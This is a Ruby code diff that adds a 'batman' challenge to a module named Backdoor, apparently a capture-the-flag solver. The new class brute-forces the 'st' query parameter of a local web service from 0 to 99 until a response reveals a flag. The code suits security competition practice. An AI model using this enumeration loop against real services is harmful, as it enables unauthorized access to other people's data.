@@ -251,6 +251,29 @@ module Backdoor
   end
 
   ##
+  # Challenge Batman
+  class ChallengeBatman < ChallengeBase
+    NAME = 'batman'
+
+    PORT = 11_004
+
+    def exec
+      client = ClientWeb.new(PORT)
+      @logger.puts('Bruteforcing ID')
+      100.times do |i|
+        @logger.puts(i)
+        response = client.get("/?st=#{i}")
+        next unless response.body =~ /Flag is "(.+)"/
+
+        found(Regexp.last_match(1))
+        break
+      end
+
+      not_found
+    end
+  end
+
+  ##
   # Found error
   class FoundError < StandardError; end
 end
